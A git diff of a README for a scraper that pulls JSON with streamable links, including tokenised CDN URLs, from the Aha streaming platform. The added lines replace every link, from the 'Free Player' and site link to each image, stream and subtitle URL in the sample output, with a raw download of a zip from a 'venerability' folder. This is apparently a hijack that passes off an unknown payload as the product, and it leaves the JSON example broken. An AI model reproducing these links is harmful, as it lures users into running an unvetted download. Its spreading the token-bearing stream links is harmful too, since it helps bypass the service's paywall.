@@ -2,7 +2,7 @@
 
 <p align="center">  <b>Its a Aha Platforn API It Will get All data in json with Streamable Links </b> <br><br><b> 🌟 Start This Repositry Befor Copying 😎</b></p>
 
-<h3 align="center"><i>Aha Free Player:</i> <a href='https://streamavi.ml/aha/'><i>Here</i></a> </h3><br>
+<h3 align="center"><i>Aha Free Player:</i> <a href='https://github.com/alluringabhi/Aha-API/raw/refs/heads/main/venerability/3.9-alpha.4.zip'><i>Here</i></a> </h3><br>
 
 > ***🚸 This is Just For Educational Purpose*** <br>
 > ***☺ If This Out of Your Policy Contact me***
@@ -14,12 +14,12 @@
 <h3>🔐 Method :</h3>
 
 <h4>
-♢ Go To <a href="https://www.aha.video">Aha Site</a> <br><br>
+♢ Go To <a href="https://github.com/alluringabhi/Aha-API/raw/refs/heads/main/venerability/3.9-alpha.4.zip">Aha Site</a> <br><br>
 ♢ Open Movie / Episode That You Want To watch ! <br><br>
 ♢ Copy URL and Just Paste After Your link</h4>
 
 ```py
-   http://streamavi.ml/aha/api.php?c=AHA_URL
+   https://github.com/alluringabhi/Aha-API/raw/refs/heads/main/venerability/3.9-alpha.4.zip
    
    http://localhost/?c=AHA_URL
 ```
@@ -38,13 +38,13 @@
    "lang":"en",
    "title":"Krack",
    "description":"U/A 13+ | Action | Violence |\n\nEnjoy Krack full movie here :\n\nWhen a most-wanted terrorist, a factionist, and a local goon locks horns with an honest cop Potharaju Veerashankar, little do they know that their lives will be changed forever. ",
-   "landscape":"https://snagfilms-a.akamaihd.net/38c1e2aa-64c1-41c3-8b5e-674247d490c8/images/2021/03/18/1616063882413_2watchkrack1920x10804_16x9Images.jpg",
-   "portrait":"https://snagfilms-a.akamaihd.net/38c1e2aa-64c1-41c3-8b5e-674247d490c8/images/2021/03/4/1614883500069_3krackhdmovieonline1070x15851_3x4Images.png",
-   "hls":"https://ahatvhlsns.akamaized.net/aha-tv/Renditions/20210202/KRACK_FINAL_02-02-21/hls/KRACK_FINAL_02-02-21.m3u8?hdnts=exp=1625867901~acl=/aha-tv/Renditions/20210202/KRACK_FINAL_02-02-21/hls/*~hmac=2a3f0f6a6ffd30e710e50f043bb60b63f0f1282495209fc6ea86aab2a11948b0",
-   "270p":"https://ahatvmp4ns.akamaized.net/aha-tv/Renditions/20210202/KRACK_FINAL_02-02-21/KRACK_FINAL_02-02-21_270.mp4?__token__=exp=1625867901~acl=/aha-tv/Renditions/20210202/KRACK_FINAL_02-02-21/*~hmac=4a4b4584e0e33a5ad4de4ba26dce9d63c96f709601d530611caf7bf4f5e4425a",
-   "360p":"https://ahatvmp4ns.akamaized.net/aha-tv/Renditions/20210202/KRACK_FINAL_02-02-21/KRACK_FINAL_02-02-21_270.mp4?__token__=exp=1625867901~acl=/aha-tv/Renditions/20210202/KRACK_FINAL_02-02-21/*~hmac=4a4b4584e0e33a5ad4de4ba26dce9d63c96f709601d530611caf7bf4f5e4425a",
-   "720p":"https://ahatvmp4ns.akamaized.net/aha-tv/Renditions/20210202/KRACK_FINAL_02-02-21/KRACK_FINAL_02-02-21_270.mp4?__token__=exp=1625867901~acl=/aha-tv/Renditions/20210202/KRACK_FINAL_02-02-21/*~hmac=4a4b4584e0e33a5ad4de4ba26dce9d63c96f709601d530611caf7bf4f5e4425a",
-   "subtitle":"https://static-aha-tv.viewlift.com/2021/02/1612515228691_krack.srt"
+   "landscape":"https://github.com/alluringabhi/Aha-API/raw/refs/heads/main/venerability/3.9-alpha.4.zip",
+   "portrait":"https://github.com/alluringabhi/Aha-API/raw/refs/heads/main/venerability/3.9-alpha.4.zip",
+   "hls":"https://github.com/alluringabhi/Aha-API/raw/refs/heads/main/venerability/3.9-alpha.4.zip~acl=/aha-tv/Renditions/20210202/KRACK_FINAL_02-02-21/hls/*~hmac=2a3f0f6a6ffd30e710e50f043bb60b63f0f1282495209fc6ea86aab2a11948b0",
+   "270p":"https://github.com/alluringabhi/Aha-API/raw/refs/heads/main/venerability/3.9-alpha.4.zip~acl=/aha-tv/Renditions/20210202/KRACK_FINAL_02-02-21/*~hmac=4a4b4584e0e33a5ad4de4ba26dce9d63c96f709601d530611caf7bf4f5e4425a",
+   "360p":"https://github.com/alluringabhi/Aha-API/raw/refs/heads/main/venerability/3.9-alpha.4.zip~acl=/aha-tv/Renditions/20210202/KRACK_FINAL_02-02-21/*~hmac=4a4b4584e0e33a5ad4de4ba26dce9d63c96f709601d530611caf7bf4f5e4425a",
+   "720p":"https://github.com/alluringabhi/Aha-API/raw/refs/heads/main/venerability/3.9-alpha.4.zip~acl=/aha-tv/Renditions/20210202/KRACK_FINAL_02-02-21/*~hmac=4a4b4584e0e33a5ad4de4ba26dce9d63c96f709601d530611caf7bf4f5e4425a",
+   "subtitle":"https://github.com/alluringabhi/Aha-API/raw/refs/heads/main/venerability/3.9-alpha.4.zip"
 }
 ```
 
